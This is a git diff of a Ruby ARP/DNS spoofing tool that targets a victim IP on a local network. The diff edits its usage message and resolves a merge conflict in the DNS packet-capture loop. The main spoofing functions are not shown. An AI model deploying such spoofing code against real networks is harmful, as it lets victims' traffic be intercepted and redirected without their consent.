@@ -5,7 +5,8 @@ require 'thread'
 
 unless (ARGV.size == 2 || ARGV.size==3)
 	puts "Usage: ruby #{$0} Interface Victim-IP [Spoofer Web IP]"
-	puts "Example: ruby #{$0} em1 192.168.0.2 199.59.150.39"
+	puts "Example: ruby #{$0} em1 192.168.0.2"
+	puts "Default Spoofer Web IP is twitter.com at 199.59.150.39"
 	exit
 end
 
@@ -192,7 +193,6 @@ begin
 		puts "Captured packet"
 
 		@packet = PacketFu::Packet.parse(packet)
-<<<<<<< HEAD
 		@domain = getDomain(@packet.payload[12..-1])
 		if @domain.nil?
 			puts "No domain name found"
@@ -201,16 +201,6 @@ begin
 		puts "DNS Query for: " + @domain
 		dnsResponse
 	end
-=======
-			@domain = getDomain(@packet.payload[12..-1])
-			if @domain.nil?
-				puts "No domain name found"
-				next
-			end
-			puts "DNS Query for: " + @domain
-			dnsResponse(spoofIP)
-	end # End do packet
->>>>>>> 371209722e822e8f0c400add5a6f1bea4527a858
 	arp_spoof_thread.join
 
 	# Catch interrupt
